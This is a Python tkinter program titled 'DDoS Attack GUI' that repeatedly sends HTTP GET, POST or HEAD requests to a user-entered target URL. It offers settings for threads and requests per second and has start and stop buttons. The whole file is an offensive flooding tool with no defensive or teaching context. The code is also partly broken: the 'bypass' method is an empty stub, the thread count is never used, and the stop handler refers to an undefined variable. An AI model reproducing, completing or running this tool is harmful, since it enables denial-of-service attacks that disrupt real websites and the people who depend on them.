import tkinter as tk
from tkinter import ttk
import requests
import threading
import time
import sys
from datetime import datetime

class DDoS:
    def __init__(self, url, method='GET', pps=100):
        self.url = url
        self.method = method
        self.pps = pps
        self.running = False

    def attack(self):
        self.running = True
        while self.running:
            try:
                if self.method == 'POST':
                    requests.post(self.url)
                elif self.method == 'GET':
                    requests.get(self.url)
                elif self.method == 'HEAD':
                    requests.head(self.url)
                elif self.method == 'flood_get':
                    self.flood_get()
                elif self.method == 'bypass':
                    self.flood_bypass()
                else:
                    print("Method not supported.")
                    return
                parse(self, requests.get(self.url))
                time.sleep(1 / self.pps)
            except requests.exceptions.RequestException as e:
                print('Error:', e)

    def stop_attack(self):
        self.running = False

    def flood_bypass(self):
        pass

    def flood_get(self):
        while self.running:
            try:
                response = requests.get(self.url)
                parse(self, response)
                time.sleep(1 / self.pps)
            except requests.exceptions.RequestException as e:
                print('Error:', e)

def parse(self, response):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f'{current_time} DDoS Attack: {response.url}')

def start_attack():
    target_url = url_entry.get()
    method = method_combobox.get()
    number_of_threads = int(threads_entry.get())
    pps = int(pps_entry.get())

    if number_of_threads > 10000:
        result_label.config(text="Error: Maximum 10000 threads allowed.")
        return

    if pps > 10000:
        result_label.config(text="Error: Maximum 10000 PPS allowed.")
        return

    ddos = DDoS(target_url, method, pps)

    # Disable the "Start Attack" button during the attack
    start_button.config(state=tk.DISABLED)
    
    # Start the attack in a separate thread
    attack_thread = threading.Thread(target=ddos.attack)
    attack_thread.daemon = True
    attack_thread.start()

    # Enable the "Stop Attack" button
    stop_button.config(state=tk.NORMAL)

def stop_attack():
    ddos.stop_attack()
    
    # Disable the "Stop Attack" button
    stop_button.config(state=tk.DISABLED)
    
    # Enable the "Start Attack" button
    start_button.config(state=tk.NORMAL)
    result_label.config(text="Attack stopped.")

root = tk.Tk()
root.title("DDoS Attack GUI")

frame = ttk.Frame(root, padding=10)
frame.grid(column=0, row=0, sticky=(tk.W, tk.E, tk.N, tk.S))

url_label = ttk.Label(frame, text="Target URL:")
url_label.grid(column=0, row=0, sticky=tk.W)

url_entry = ttk.Entry(frame)
url_entry.grid(column=1, row=0, columnspan=2, sticky=(tk.W, tk.E))

method_label = ttk.Label(frame, text="Method:")
method_label.grid(column=0, row=1, sticky=tk.W)

methods = ['GET', 'POST', 'HEAD', 'flood_get', 'bypass']
method_combobox = ttk.Combobox(frame, values=methods)
method_combobox.grid(column=1, row=1, columnspan=2, sticky=(tk.W, tk.E))
method_combobox.set('GET')

threads_label = ttk.Label(frame, text="Number of Threads:")
threads_label.grid(column=0, row=2, sticky=tk.W)

threads_entry = ttk.Entry(frame)
threads_entry.grid(column=1, row=2, columnspan=2, sticky=(tk.W, tk.E))

pps_label = ttk.Label(frame, text="Packets per Second:")
pps_label.grid(column=0, row=3, sticky=tk.W)

pps_entry = ttk.Entry(frame)
pps_entry.grid(column=1, row=3, columnspan=2, sticky=(tk.W, tk.E))

start_button = ttk.Button(frame, text="Start Attack", command=start_attack)
start_button.grid(column=0, row=4, columnspan=2)

stop_button = ttk.Button(frame, text="Stop Attack", command=stop_attack, state=tk.DISABLED)
stop_button.grid(column=2, row=4)

result_label = ttk.Label(frame, text="")
result_label.grid(column=0, row=5, columnspan=3)

root.mainloop()
